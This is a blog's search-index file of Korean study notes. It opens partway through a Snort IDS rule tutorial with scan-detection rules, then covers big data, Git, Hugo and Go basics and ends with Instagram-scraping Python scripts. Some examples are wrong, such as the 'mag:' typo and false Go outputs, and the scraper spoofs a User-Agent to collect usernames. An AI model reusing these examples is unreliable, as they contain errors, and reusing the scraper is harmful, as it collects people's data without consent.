남기지 않는다.\n      프로토콜\n TCP, UDP, ICMP, IP      IP 주소\n  any는 모든 IP\n  논리부정연산자(!) 사용 가능\n  여러 IP주소에 대한 표기 [] 사용, 콤마(,)로 구분\n ex) !192.168.1.0/24 ![192.168.1.0/24,10.1.1.0/24]      포트 번호\n  1:1024 = 1 ~ 1024\n  :1024 = 1024 port 이하\n  1024: = 1024 port 이상\n  !1:1024 = 1 ~ 1024 port를 제외한 나머지\n    패킷 방향\n -\u0026gt; outgoing 패킷 \u0026lt;- 존재하지 않는다 \u0026lt;\u0026gt; 양방향    Rule Option    Rule Option은 새미콜론(;)으로 구분한다.\n  general : 룰에 대한 정보를 포함하는 옵션\n  msg : alert 엔진을 통해 전달하는 메시지를 설정할 수 있다.\n ex) msg:\u0026ldquo;\u0026rdquo;;    sid : Snort ID의 약자로 룰을 식별하기 위해 사용된다.\n ex)sid:;    payload : 패킷 내 페이로드 내부의 데이터를 찾고 상호작용을 할 수 있는 옵션\n  content : 페이로드 내 존재하는 특정 문자열이나 헥스 값 등을 판별하여 룰에 영향을 줄 수 있다. 사실상 가장 많이 쓰일 것 같다. 헥스 값의 경우 ‘|’ 으로 감싸주어 사용 가능하다.\n ex)content :[!]\u0026ldquo;\u0026rdquo;;    depth : 지정된 패턴을 검색 시 패킷의 길이를 지정할 수 있다. depth가 5인 경우 페이로드의 처음 5바이트 내에서 지정된 패턴을 찾는다. offset 키워드와 함께 사용 가능하다.\n  offset : depth와 비슷하며 함께 자주 쓰인다. 말 그대로 해당 오프셋부터 패턴을 검색한다. offset이 5인 경우 offset 5부터 지정된 패턴을 검색한다.\n ex) alert tcp any any -\u0026gt; any 80 (content:\u0026ldquo;cgi-bin/phf\u0026rdquo;; offset:4; depth:20;) 80(http/tcp)로 접근하는 모든 패킷의 offset 4부터 20바이트 내 cgi-bin/phf 문자열이 존재하는지 확인한다.    non-payload : 페이로드가 없는 데이터에서 사용\n  fragoffset : IP Fragment 오프셋 필드의 값을 비교할 수 있다.\n ex)fragoffset:[!]\u0026lt;|\u0026gt;];    ttl : TTL(Time To Live) 항목이다. traceroute 명령어를 탐지하기 위한 키워드이다.\n ex)ttl:[\u0026lt;,\u0026gt;,=,\u0026lt;=,\u0026gt;=]; , ttl:[]-[\u0026lt;number];    fragbits : 단편화된 패킷이거나 IP Header 내 flags 필드에 비트가 설정되어 있는지 확인하는데 사용된다.\n ex)fragbits:MD+; More Fragments bit \u0026amp; Don’t Fragments bit    flags : TCP flag 비트를 확인하는데 사용한다. 기본적으로 UAPRSF(URG, ACK, PSH, RST, SYN, FIN)를 확인할 수 있고, 추가적으로 CWR, ECE 를 사용할 수 있다.\n  ex) alert tcp any any -\u0026gt; any any (flags:SF;) 모든 패킷에 SYN과 FIN 패킷을 탐지한다.\n  탐지 가능한 공격 : X-Mas 스캔, Null 스캔\n X-Max 스캔  alert tcp any any -\u0026gt; any any (mag:\u0026#34;X-Max Scan Detected!!\u0026#34;; flags:FPU; sid:1000004;)  - Null 스캔 ```python alert tcp any any -\u0026gt; any any (mag:\u0026quot;Null Scan Detected!!\u0026quot;; flags:0; sid:1000005;)      threshold 옵션 : 행위기반 탐지가 가능한 옵션\n track by_src : 동일한 출발지에서 track by_dst : 동일한 목적지로  threshold:type threshold, limit, both # 패킷량, 임계시간 임계시간 단위당 로그 발생량  - count : 수 - seconds : 초   seq : TCP sequence number를 확인한다.\n ex) seq:0;    ack : TCP acknowledge number를 확인한다.\n ex) ack:0;    Post-detection : 사후탐지에 대한 옵션, 룰 실행 후의 규칙\n  react : 패킷을 차단하거나 경고 메시지를 출력한다.\n react:block; : 패킷을 차단한다    ARP 탐지 추가\n vi /etc/snort/snort.conf ARP spoot 수정 preprocessor arpspoof_detect_host: [ IP 주소 ] [ MAC 주소 ]    preprocessos : snort.conf 파일에 설정하는 전처리 기능\n  itype : ICMP Type 지정\n  icode : ICMP Type의 Code 지정\n  ICMP Redirect 탐지, ICMP 요청만 탐지\n      \r\r\r    스노트 실습 \r스노트 실습\r...\r\r 실습 환경 구성     스노트 실습  \r\r\r ~ ~\n"});index.add({'id':153,'href':'/docs/programing/git/bigdata/','title':"Bigdata",'content':"빅데이터란  Bigdata    빅데이터는 큰 사이즈의 데이터로부터 유의미한 지표를 분석해내는 행위 SNS, 로그, 문서 등 다양한 경로를 통해 수집한 여러가지 형태의 많은 양의 데이터를 이용하여 의사결정에 도움을 주는 지표를 분석하여 제공하는 것   Bigdata가 대두 되어지는 이유  데이터 양의 증가와 데이터 저장기술 발달 경제적 타당성 증가/ 저장장치의 가격 인하 데이터 처리 기술의 발달   Bigdata 5V  Volume - 크기  저장장치 가격의 하락, 네트워크 속도의 향상으로 수 페타바이트의 데이터가 매일 생성   Variety - 다양성  정형, 반정형, 비정형 형태의 다양한 데이터를 분석   Velocity - 속도  정보의 유통 속도가 굉장히 빠름. 데이터의 처리 속도가 빠름. 일, 주, 월단위 배치 처리와 초단위 실시간 데이터 처리   Value - 가치  유의미한 가치를 가지는 지표 지표를 사용하는 사람의 의사 결정에 도움을 줄 수 있는 정보를 제공   Veracity - 정확성  빅데이터를 이용하여 뽑아낸 데이터의 신뢰성, 정확성이 높음 데이터가 많아질수록 더 정확한 분석이 가능     데이터 활용의 목적  기업   빅데이터를 활용해 소비자의 행동을 분석하고 시장 변동을 예측하여 비즈니스 모델을 혁신하거나 신사업을 발굴합니다.  페이스북  마우스 커서의 움직임을 수집하여 사용자 이용환경 개선과 광고 효과의 극대화에 활용   아마존  사용자의 개인 정보, 구매 내역 등을 활용하여 자동 도서 추천 구매내역, 장배구니 내역 등을 활용하여 물품의 구매를 예측하여 물류 예측 배송 서비스      정부   기상, 인구이동, 각종 통계 정보를 수집하여 사회 변화를 추정하거나, 환경 탐색, 주변국의 상황을 분석하여 장기적인 관점의 대응책을 분석합니다.  올빼미 버스  서울시와 KT가 협력하여 심야시간 유동인구를 분석하여 심야 시간 전용 버스의 배차 서비스 시작      개인   개인의 목적에 따라 활용합니다.  미국 대통령선거  버락 오바마 대통령이 빅데이터를 활용하여 유권자 개인에게 맞춤형 공약 정보 제공        데이터의 형태   수집 형태의 종류  정형  데이터베이스, CSV, 엑셀과 같이 칼럼 단위의 명확한 구분자와 형태가 존재하는 데이터   반정형  XML, HTML, JSON 형태와 같이 여러 가지 형태가 있을 수 있지만, 메타데이터나 스키마가 존재하는 데이터   비정형  동영상, SNS 메시지, 사진, 오디오, 음성 데이터처럼 형태가 존재하지 않는 데이터     수집 시간의 종류  배치  시, 일, 주, 월 단위로 일정한 주기로 수집, 처리되는 데이터   실시간  실시간 검색어, 실시간 차트 처럼 사용자의 입력과 동시에 처리되는 데이터     분석 형태의 종류  대화형 분석  대화형 대쉬보드   배치분석  일/주/월간 보고서   실시간 분석  결제/사기 경고 1분 측정   기계 학습  심리 분석, 예측 모델      빅데이터 처리단계   수집  데이터를 수집하는 단계 정형,비정형, 반정형 데이터 수집   정제  수집한 데이터를 적재하기 위해 필요 없는 데이터, 깨진 데이터를 정리하는 단계 반정형, 비정형 데이터는 분석에 필요한 데이터 외에 필요 없는 부분을 제거하는 단계가 필요함   적재  정제된 데이터를 분석하기 위해 적재하는 단계 RDB, NoSQL 데이터베이스, Redshift, Druid 등의 도구에 적재   분석  적재한 데이터를 의미 있는 지표로 분석하는 단계 의사결정권자나 이용자가 사용할 수 있는 데이터로 분석하는 단계   시각화  분석한 데이터를 도표로 보여주는 단계 데이터를 이해하기 쉬운 차트로 분석하는 단계     수집  빅데이터는 내부/외부의 여러 원천에서 데이터를 수집   내부/ 외부 데이터   내부 데이터  시스템 로그, DB 데이터   외부 데이터  동영상, 오디오 정보 웹 크롤링 데이터 SNS 데이터      수집 방식   기존 데이터 수집  HTTP 웹서비스, RDB, FTP, JMS, Text   새로운 방식의 데이터 수집  SNS의 여러가지 데이터  Text, 이미지, 동영상   전화 음성, GPS IoT 디바이스 센서 공간 데이터 + 인구 데이터   데이터 수집 트랜잭션  데이터를 수집할 때 연동하는 데이터가 적다면 개별적으로 관리가 가능하지만 수백, 수천개가 되면 트랜잭션 관리가 어려울 수 있습니다. 데이터의 유실, 데이터의 전송 여부 확인을 위한 트랜잭션 처리가 중요     데이터 수집 기술   Flume 플룸은 많은 양의 로그 데이터를 효율적으로 수집, 취합, 이동하기 위한 분산형 소프트웨어 Kafka  오픈 소스 메시지 브로커 프로젝트   Sqoop  관계형 데이터 베이스와 아파치 하둡간의 대용량 데이터들을 효율적으로 변환 하여 주는 명령 줄 인터페이스 애플리케이션   Nifi  소프트웨어 시스템 간 데이터 흐름을 자동화하도록 설계된 소프트웨어 프로젝트   Flink  오픈 소스 스트림 처리 프레임 워크   Splunk  기계가 생성한 빅 데이터를, 웹 스타일 인터페이스를 통해 검색, 모니터링, 분석하는 소프트웨어   Logstash  실시간 파이프라인 기능을 가진 오픈소스 데이터 수집 엔진   Fluentd  크로스 플랫폼 오픈 소스 데이터 수집 소프트웨어 프로젝트     정제  데이터를 분석 가능한 형태로 정리하는 작업으로 여러 경로에서 수집된 데이터가 형식이 다르기 때문에 분석 단계에 사용할 도구에 맞는 형태로 변환하며 압축하여 데이터 사이즈를 줄이는 작업    정제 단계   Identification  알려진 다양한 데이터 포맷이나 비정형 데이터에 할당된 기본 포맷을 식별   Filtration  수집된 정보에서 정확하지 않은 데이터는 제외   Validation  데이터 유효성을 검증   Noise Reduction  오류 데이터를 제거 분석 불가능한 데이터는 제외   Transformation  데이터를 분석 가능한 형태로 변환   Compression  저장장치 효율성을 위해 변환한 데이터를 압축   Integration  처리 완료한 데이터를 적재     적재  대량의 데이터를 안전하게 보관하고 분석할 수 있는 환경으로 옮기는 단계 분석에 사용할 도구에 따라 NoSQL, 클라우드 스토리지, HDFS 등 다양한 환경으로 데이터를 적재   분석  분석 단계는 적재된 데이터를 이용하여 의사 결정을 위한 데이터를 제공하기 위한 리포트를 생성하는 단계 대용량의 데이터를 빠르게 부넉하기 위한 처리 엔진이 필요하고, 효율적으로 분석하기 위해서 파티셔닝, 인덱싱 등의 기술이 필요   시각화  최종적으로 시각화 단계로, 데이터를 시각화하는 단계   "});index.add({'id':154,'href':'/docs/programing/git/git/','title':"Git",'content':"Git\u0026amp;\u0026amp; Github  깃 ( git )    Git 공식 홈페이지 에서 다운로드\n  형상 관리 도구 ( Configuration Management Tool )인 분산형 관리 시스템\n  무료, 공개소프트웨어 서비스\n  소스코드를 주고 받을 필요 없이, 같은 파일을 여러 명이 동시에 작업하는 병렬 개발이 가능\n  분산 버전관리이기 때문에 인터넷이 연결되지 않은 곳에서도 개발을 진행할 수 있으며, 중앙 저장소가 날라가벌도 다시 원상복구가 가능\n     git의 특징   버전관리   깃에서 버전이란 문서를 수정하고 저장할 때마다 생기는 지점\n  원래 파일 이름은 그대로 유지하면서 파일에서 무엇을 변경했는 지 변경 시점마다 저장이 가능\n  각 버전마다 작업했던 내용을 확인할 수 있음\n  과거의 버전으로 회귀가 가능\n     Stage 와 Commit   작업 트리: 파일 수정, 저장 등의 작업을 하는 디렉토리\n  스테이지: 버전으로 만들 파일이 대기하는 장소\n  저장소: 스테이지에서 대기하고 있던 파일들을 버전으로 만들어 저장하는 장소\n      hello.txt 파일 문서를 수정하고 저장하면 그 파일은 작업 트리에서 스테이지로 이동    파일 수정을 마쳤다면 버전을 만들기 위해 Commit 명령을 내림 Commit 명령이 내려지면 새로운 버전이 생성되며 스테이지에 대기하던 파일 모두 저장소에 저장 됨     백업   원격 저장소   깃에서는 지역( Local ) 저장소와 원격( Remote ) 저장소를 연결해 버전 관리하는 파일들을 쉽게 백업이 가능\n  원격 저장소에서 깃을 사용가능\n  지역 저장소를 백업 가능\n  협업 프로젝트에 사용 가능\n  다른 사람의 소스 관찰 및 오픈 소스 참여 가능\n     협업   git 파일의 단계    untracke: 한 번도 스테이지 상태에 올라가지 않은 파일\n  tracked: 한 번이라도 스테이지 상태에 올라간 파일\n  unmodified: 스테이지 상태에서 commit이 실행된 후 파일의 상태\n  modified: unmodified 상태에서 수정된 후 파일의 상태\n  .gitgnore: 버전 관리 중인 디렉토리 안에 버전 관리를 하지 않을 특정 파일 또는 디렉토리가 있는 경우 .gitignore의 목록을 지정 가능\n   Branch   Branch는 분기를 요구에 따른 나타냄    git 원격접속   SSH ( Secure SHell )   보안이 강화된 안전한 방법으로 정보를 교환하는 방식\n  Private key, Public key를 한 쌍으로 묶어 컴퓨터를 인증\n      key 생성 Private key를 복사 후 로그인 사용자 아이콘의 Setting을 클릭\n  SSH and GPG keys 선택 후 퍼블릭 키를 추가하기 위해 New SSH key 선택\n  퍼블릭 키를 복사 ( 비밀번호 확인 )\n  새로운 저장소를 생성 후 명령어를 통해 원격 저장소와 연결\n     git 명령어   사용자 이름 설정 ( 시스템 전체 )  git config --global user.name [ user name ]\r 사용자 이메일 설정 ( 시스템 전체 )  git config --global user.email [ user email ]\r 깃 초기화  git init\r 저장소 상태확인  git status\r 파일 스테이징  git add \u0026#34;수정파일\u0026#34;\r Commit  git commit --amend\r 방금 출력한 Commit 메시지 수정  git commit -m \u0026#34;message\u0026#34;\r git 버전 확인  git log / git log --stat ( commit status )\r 변경 사항 확인  git diff\r 작업 트리를 최신으로 되돌리기  git checkout --[ file name ]\r 스테이징 되돌리기 일반 | 최신 커밋 전 | 최신 커밋과 스테이징 전 | 수정 전 상태 복구 x  git reset HEAD [ File name ]\r--soft HEAD^\r--mixed HEAD^\r--hard HEAD^\r 브랜치 확인  git branch\r 브렌치 생성  git branch [ branch name ]\r 브렌치 제거  git branch -D [ branch name ]\r 브렌치 이동  git checkout [ branch name ]\r 브랜치 사이의 차이점 알아보기  git log [ A ]..[ B ]\r 편집기 열리지 않게 하기  git merge o2 --no-edit\r 편집기 열기  git merge o2 edit\r 지역 저장소 생성  git init [ Storage name ]\rcd [ Storage name ]\rvi [ any file ]\rgit add [ any file ]\rgit commit -m add [ any file ]\r 원격 저장소 연결  git remote add origin [ copy address ]\rgit remote -v\r 원격 저장소에 파일 올리기 u | f, 지역과 원격 연결 1회 | 강제  git push -u [ destination ] [ branch ]\r 원격 저장소에서 파일 내려 받기  git pull [ source ] [ branch ]\r SSH 키 생성  ssh-keygen\r SSH 주소로 원격 저장소 연결  git init ssh-connect\rcd ssh-connect\rgit remote add [ destination ] [ git@github.com:username@connect-ssh.git]\r 원격 저장소 복제  git clone [ git address]\r   "});index.add({'id':155,'href':'/docs/programing/git/hugo/','title':"Hugo",'content':"Hugo  휴고 다운로드\n   So cutey\n  Hugo는 Go언어를 기반으로 Go 언어를 이용한 프로그램 사용 및 수정\n  Markdown으로 글을 작성\n  git을 활용한 글 관리 및 버전 관리\n     Hugo 적용    Hugo 환경변수 등록\n  휴고 사이트 시작\n  hugo new site testproject\rcd testproject\rhugo server -D\r  테마 적용    Hugo 테마 다운로드\n  testproject 안의 themes 폴더에 테마를 넣는다\n  config.toml 파일에 theme = \u0026ldquo;테마이름을 추가\u0026rdquo;\n  themes/[ 테마이름 ]/examplesite/로 이동 후 config 파일을 제외한 모든 파일을 복사하여 testproject 아래에 복사한다.\n  hugo server -D를 통해 동작을 확인한다.\n      Github Page 적용   git init\rgit remote add origin [ base Storage url ]\rgit submodule add -b master [ github.io Storage url ] public hugo -t [ theme name ]\rcd public\rgit add .\rgit commit -m \u0026#34;message\u0026#34;\rgit push origin master\rcd ..\rgit add . git commit -m \u0026#34;message\u0026#34;\rgit push origin master\r  submodule 생성시 public 폴더가 없어야 함\n  username.git.io로 확인\n  "});index.add({'id':156,'href':'/docs/programing/golang/golang/','title':"Golang",'content':"Golang 설치  Go 공식 홈페이지에서 OS맞는 패키지를 설치   Golang Study 사이트  Go 기본 메뉴얼 가장 빨리 만나는 Go 언어 Go-tour    Go 기초 문법  중괄호 표기법  Go는 문법의 작성 스타일을 강제 Go의 대표적인 문법으로는 { } ( 중괄호 ) 표기 법이 있음 즉, 함수, 조건문, 반복문 등을 시작할 때는 반드시 같은 줄에서 시작   ; 세미콜론  마지막 구문의 세미클론을 생략 한 줄에 여러 구문을 사용할 때에는 세미콜론을 사용하여 나눔  fmt.Println(\u0026#34;Hello,\u0026#34;);fmt.Println(\u0026#34;world!\u0026#34;)\r 주석 // 한줄 주석\r/*\r여러 줄 주석\r여러 줄 주석\r*/\r  변수 사용하기  var 키워드 사용하는 방식  var i int\rvar s string\rvar age int = 10\rvar name string = \u0026#34;Maria\u0026#34;\r  자료형을 사용하는 방식  var age = 10\rvar name = \u0026#34;Maria\u0026#34;\r  :=를 사용하면 var와 자료형 키워드를 사용하지 않고 선언가능  age := 10\rname := \u0026#34;Maria\u0026#34;\r  , ( 컴마 )를 사용하여 여러 변수를 선언하기  변수를 선언한 순서대로 값이 대입되며, 반드시 선언한 변수의 개수와 대입할 값의 개수가 값아야 함    var x, y int = 30, 50\rvar age, name = 10, \u0026#34;Maria\u0026#34;\ra, b, c, d := 1, 3.4, \u0026#34;Hello, world!\u0026#34;, false\rvar x, y int\rvar age int\rx, y, age = 10, 20, 5\r  var를 사용한 다중처리  var (\rx, y int = 30, 50\rage, name = 10, \u0026#34;Maria\u0026#34;\r)\r  _( 밑줄 문자 )를 사용한 에러 방지  package main\rimport \u0026#34;fmt\u0026#34;\rimport _ \u0026#34;time\u0026#34; // 사용하지 않는 패키지로 인한 컴파일 에러 방지\rfunc main() {\ra := 1\rb := 2\r_ = b // 사용하지 않는 변수로 인한 컴파일 에러 방지\r\rfmt.Println(a)\r}\r 선언만 하고 사용하지 않는 변수가 있으면 에러 발생 import 하고 사용하지 않는 패키지가 있으면 에러 발생 \r\r  Golang 자료형  \rGo 변수의 종류와 값의 범위\r↕\r\r\r\r\r   8진수에는 앞에 0이, 16진수 앞에는 0x or 0X가 붙음  var go1 int = 30\rvar go2 int = -15\rvar go3 int = 0723 // 8진수로 저장\rvar go4 int = 0x2f2c75 or 0X2f2c75 // 16진수로 저장   실수는 소수점을 사용 및 지수 표기법으로 선언이 가능  // 소수점 표기\rvar go1 float32 = 0.5\rvar go2 float32 = .32\rvar go3 float32 = 100.12345\r// 지수 표기\rvar ggo1 float32 = 1e7\rvar ggo2 float64 = .12345E+2\rvar ggo3 float64 = 1.23453e-10   복소수난 실수부와 허수부가 붙은 형태이며 마지막에 i를 붙임  real 함수는 실수부를 호출 imag 함수는 허수부를 호출    var go complex64 = 1 + 2i // 실수부 1, 허수부 2\rvar go2 complex128 = 2.2344e-10 + .12345E+2i // 실수부 지수 표기법 2..., 허수부 지수 표기법 .12345E+2\rvar go3 complex64 = coplex(1, 2) // 실수부 1, 허수부 2\rvar go4 complex128 = complex(2.2344e-10 + .12345E+2i) // 실수부 지수 표기법 2..., 허수부 지수 표기법 .12345E+2\r\rvar r1 float32 = real(num1) // 실수부 1 호출\rvar l1 float32 = imag(num1) // 허수부 2 호출\r 컴퓨터는 2진수로 계산하기에 정확한 실수의 계산이 불가능 즉, == ( 등호 )로 비교시 오류발생가능 \r\r  byte는 16진수, 문자 값으로 저장 byte는 데이터를 읽고 쓰기, 데이터 암호화에 사용  var go1 byte = 10 // 10진수로 저장\rvar go1 byte = 0x32 // 16진수로 저장\rvar go1 byte = \u0026#39;a\u0026#39; // 문자로 저장\r byte 사용시 문자열 컴파일시 \u0026quot; \u0026quot; 가 아닌 ' \u0026lsquo;를 사용해야 함 \r\r Rune  Rune은 유니코드 ( UTF-8 ) 문자 코드를 저장할 때 사용 \u0026rsquo; ' ( 작은 따움표 )로 묶어줘야 함 \\u, \\U를 사용하여 문자 코드로 저장이 가능 전체 유니코드  var go1 rune = \u0026#39;한\u0026#39;\rvar go2 rune = \u0026#39;\\ud55c\u0026#39;\rvar go3 rune = \u0026#39;\\U0000d55c\u0026#39;\r// 전부 \u0026#39;한\u0026#39;을 출력\r 숫자 연산  *숫자 연산에는 +, , /, %, \u0026laquo; \u0026raquo;, ^이 사용 가능 서로 다른 자료형일 경우 컴파일 에러 발생  go1 := 3\rgo2 := 2\rfmt.Println(go1 + go2) // 5\rfmt.Println(go1 - go2) // 1\rfmt.Println(go1 * go2) // 6\rfmt.Println(go1 / go2) // 1\rfmt.Println(go1 % go2) // 1\rfmt.Println(go1 \u0026lt;\u0026lt; go2) // 12\rfmt.Println(go1 \u0026gt;\u0026gt; go2) // 0\rfmt.Println(^go1) // 252: 비트 반전 연산자\r 오버플로우와 언더플로우  자료형에서 저장할 수 있는 최대 크기가를 넘어서면 오버플로우 자료형에서 최소 크기보다 작아지면 언더플로우라 함   변수의 크기  C 언어의 sizeof 연산자와 같이 go 에서는 unsafe 패키지의 Sizeof 함수를 사용  package main\rimport \u0026#34;fmt\u0026#34;\rimport \u0026#34;unsafe\u0026#34;\r... (unsafe.Sizeof(int8)) // 1\r... (unsafe.Sizeof(int16)) // 2\r... (unsafe.Sizeof(int32)) // 4\r... (unsafe.Sizeof(int54)) // 8\r}\r  문자열 사용  문자열은 \u0026quot; \u0026quot; ( 따움표 )로 묶어주야 하며, 알파벳, 한글, 한자 등이 사용 가능 여러 줄로 된 문자열의 저장에는   (백 쿼트 ) 사용 변수와 동일하게 \\u, \\U를 사용하여 문자 코드로 저장이 가능 Go 언어는 변수에 문자열을 저장한 뒤 수정이 불가능  var go string = \u0026#34;Hello, go world!\\n\u0026#34;\rgo2 := \u0026#34;Hello, go world!\\n\u0026#34;\rvar go3 string = `Hello,\rgo\rworld!`\rgo4 := `Hello,\rgo\rworld!`  문자열 길이 구하기  \u0026ldquo;한글\u0026quot;의 문자열의 길이는 6 \u0026ldquo;Hello\u0026quot;의 문자열의 길이는 그대로 5 2바이트가 넘는 문자열의 길이를 구할 때는 unicode/utf8을 사용 문자열의 길이를 구할 때는 len함수를 사용  package main\rimport \u0026#34;fmt\u0026#34;\rimport \u0026#34;unicode/utf8\u0026#34;\rfunc main() {\rvar s1 string = \u0026#34;한글\u0026#34;\rfmt.Println(utf8.RuneCountInString(s1))\r}\r 문자열 연산하기  문자열을 비교할 때는 == 연산자를 사용 문자열을 붙일 때는 + 연산자를 사용  go1 := \u0026#34;한글\u0026#34;\rgo2 := \u0026#34;Go\u0026#34;\rfmt.Println(go1 == go2) // true\rfmt.Println(go1 + go2) // 한글Go\rfmt.Println(go2 + \u0026#34;는 비버인가?\u0026#34;) // Go는 비버인가?\r\rfmt.Println(%c\\n, go2[0]) // G\r제어문자  \r제어문자\r↕\r\r제어 문자  \\a: 경고음, 벨(u0007) \\b: 백스페이스(u0008) \\f: 폼 피드(u000c) \\n: 라인 피드, 새 줄(u000a) \\r: 캐리지 리턴(u000d) \\t: 수평 탭(u0009) \\v: 수직 탭(u000b) : 백슬래시(u005c) ': 작은따옴표(u0027), rune 변수에 저장할 때 사용할 수 있습니다. \u0026quot;: 큰따옴표(u0022), string 변수에 저장할 때 사용할 수 있습니다. \r\r\r\r    상수 사용하기  Go 언어에서는 const 를 사용하여 상수 생성이 가능 변수와 마찬가지로 문자 또는 _로 시작해야 함 consr 키워드와 ( )를 사용하면 여러 개를 한 번에 선언 및 초기화 가능  const age int = 20\rconst name string = \u0026#34;Maria\u0026#34;\rconst score int // 컴파일 에러\rage = 20 // 컴파일 에러\rname = \u0026#34;Ede\u0026#34; // 컴파일 에러\r\rconst (\rx, y int = 10, 20\rage, name = 10, \u0026#34;Maria\u0026#34;\r)\rConst와 ( ) 사용해서 열거형에 사용이 가능  상수에 일일이 대입하지 않고, 순서대로 생성하려면 iota 를 사용 1 부터 시작하길 원하면 iota +1 사용 ( 다른 연산자도 사용 가능 )  const (\rSunday = iota // 0\r Monday // 1\r Tuesday // 2\r ...\rSaturday // 6\r)\rvar a int = 1\rvar b float32 = 1.3\rvar c float32 = a + b\r package main\r// 패키지 설정\rimport \u0026#34;fmt\u0026#34;\r// \u0026#34;fmt\u0026#34; 패키지를 import 시킨다\rfunc main() {\rfmt.Println(\u0026#34;Hello, world!\u0026#34;)\r}\r// \u0026#34;fmt\u0026#34; 패키지의 Println 함수 사용\r  Go의 연산자  = 대입 연산자  "});index.add({'id':157,'href':'/docs/programing/python/code/','title':"Code",'content':"메일 자동화  이미지 크롤링 from urllib.request import urlopen\rfrom urllib.parse import quote_plus\rfrom bs4 import BeautifulSoup\rfrom selenium import webdriver\rimport time\rbaseUrl = \u0026#39;https://www.instagram.com/explore/tags/\u0026#39;\rplusUrl = input(\u0026#39;검색할 태그를 입력하세요 : \u0026#39;)\rurl = baseUrl + quote_plus(plusUrl)\rdriver = webdriver.Chrome(\u0026#39;C:\\\\chromedriver.exe\u0026#39;)\rdriver.get(url)\rtime.sleep(3)\rhtml = driver.page_source\rsoup = BeautifulSoup(html)\rinsta = soup.select(\u0026#39;.v1Nh3.kIKUG._bz0w\u0026#39;)\rn = 1\rfor i in insta:\rprint(\u0026#39;https://www.instagram.com\u0026#39;+ i.a[\u0026#39;href\u0026#39;])\rimgUrl = i.select_one(\u0026#39;.KL4Bh\u0026#39;).img[\u0026#39;src\u0026#39;]\rwith urlopen(imgUrl) as f:\rwith open(\u0026#39;C:\\\\test\\\\\u0026#39; + plusUrl + str(n) + \u0026#39;.jpg\u0026#39;, \u0026#39;wb\u0026#39;) as h:\rimg = f.read()\rh.write(img)\rn += 1\rprint(imgUrl)\rprint()\rdriver.close()\r 태그 크롤링 from bs4 import BeautifulSoup\rimport selenium.webdriver as webdriver\rimport urllib.parse\rfrom urllib.request import Request, urlopen\rfrom time import sleep\rimport pandas as pd\rfrom multiprocessing import Pool, Value, freeze_support\rnum = 0 def f(x): frame = []\rglobal num req = Request(\u0026#39;https://www.instagram.com/p\u0026#39;+x,headers={\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0\u0026#39;})\rwebpage = urlopen(req).read()\rsoup = BeautifulSoup(webpage,\u0026#34;lxml\u0026#34;,from_encoding=\u0026#39;utf-8\u0026#39;)\rsoup1 = soup.find(\u0026#34;meta\u0026#34;,attrs={\u0026#34;property\u0026#34;:\u0026#34;og:description\u0026#34;})\rreallink1 = soup1[\u0026#39;content\u0026#39;]\rreallink1 = reallink1[reallink1.find(\u0026#34;@\u0026#34;)+1:reallink1.find(\u0026#34;)\u0026#34;)]\rreallink1 = reallink1[:20]\rif reallink1 == \u0026#39;\u0026#39;:\rreturn\r#mylist.append(reallink1)\r for reallink2 in soup.find_all(\u0026#34;meta\u0026#34;,attrs={\u0026#34;property\u0026#34;:\u0026#34;instapp:hashtags\u0026#34;}):\rreallink2 = reallink2[\u0026#39;content\u0026#39;]\rreallink2 = reallink2[:10]\rmylist = []\rmylist.append(reallink1)\rmylist.append(reallink2)\rframe.append(mylist)\rprint(str(num)+\u0026#34;개의 데이터 저장 중\u0026#34;)\rnum += 1\rdata = pd.DataFrame(frame)\rdata.to_csv(\u0026#39;insta.csv\u0026#39;, mode=\u0026#39;a\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;,header=None)\rif __name__ == \u0026#39;__main__\u0026#39;:\rfreeze_support()\rprint(\u0026#34;#크롤링 속도는 컴퓨터 사양에 따라 1.0 ~ 2.5 값으로 설정해주세요.\u0026#34;)\rscrolltime = float(input(\u0026#34;크롤링 속도를 입력하세요 : \u0026#34;))\rcrawlnum = int(input(\u0026#34;가져올 데이터의 수를 입력하세요 : \u0026#34; ))\rsearch = input(\u0026#34;검색어를 입력하세요 : \u0026#34; )\rsearch = urllib.parse.quote(search)\rurl = \u0026#39;https://www.instagram.com/explore/tags/\u0026#39;+str(search)+\u0026#39;/\u0026#39;\rdriver = webdriver.Chrome(\u0026#39;c:\\\\chromedriver.exe\u0026#39;)\rdriver.get(url) sleep(5)\rSCROLL_PAUSE_TIME = scrolltime\rreallink = []\rwhile True:\rpageString = driver.page_source\rbsObj = BeautifulSoup(pageString, \u0026#34;lxml\u0026#34;)\rfor link1 in bsObj.find_all(name=\u0026#34;div\u0026#34;,attrs={\u0026#34;class\u0026#34;:\u0026#34;Nnq7C weEfm\u0026#34;}):\rtitle = link1.select(\u0026#39;a\u0026#39;)[0] real = title.attrs[\u0026#39;href\u0026#39;]\rreallink.append(real) title = link1.select(\u0026#39;a\u0026#39;)[1] real = title.attrs[\u0026#39;href\u0026#39;]\rreallink.append(real) title = link1.select(\u0026#39;a\u0026#39;)[2] real = title.attrs[\u0026#39;href\u0026#39;]\rreallink.append(real)\rlast_height = driver.execute_script(\u0026#34;return document.body.scrollHeight\u0026#34;)\rdriver.execute_script(\u0026#34;window.scrollTo(0, document.body.scrollHeight);\u0026#34;)\rsleep(SCROLL_PAUSE_TIME)\rnew_height = driver.execute_script(\u0026#34;return document.body.scrollHeight\u0026#34;)\rif new_height == last_height:\rdriver.execute_script(\u0026#34;window.scrollTo(0, document.body.scrollHeight);\u0026#34;)\rsleep(SCROLL_PAUSE_TIME)\rnew_height = driver.execute_script(\u0026#34;return document.body.scrollHeight\u0026#34;)\rif new_height == last_height:\rbreak\relse:\rlast_height = new_height\rcontinue\rreallinknum = len(reallink)\rprint(\u0026#34;총\u0026#34;+str(reallinknum)+\u0026#34;개의 데이터를 받아왔습니다.\u0026#34;)\rp = Pool(5)\rp.map(f, reallink)\rp.close()\rp.join()\rprint(\u0026#34;저장완료\u0026#34;)\r"});index.add({'id':158,'href':'/docs/programing/python/python/','title':"Python",'content':"python 내장함수 \r \r...\r\r\r\r\r\rabs abs(x)는 어떤 숫자를 입력받았을 때, 그 숫자의 절댓값을 돌려주는 함수\n\u0026gt;\u0026gt;\u0026gt; abs(3)\r3\r\u0026gt;\u0026gt;\u0026gt; abs(-3)\r3\r   all all(x)는 반복 가능한(iterable) 자료형 x를 입력 인수로 받으며 이 x가 모두 참이면 True, 거짓이 하나라도 있으면 False를 반환\n※ 반복 가능한 자료형이란 for문으로 그 값을 출력할 수 있는 것을 의미한다. 리스트, 튜플, 문자열, 딕셔너리, 집합 등이 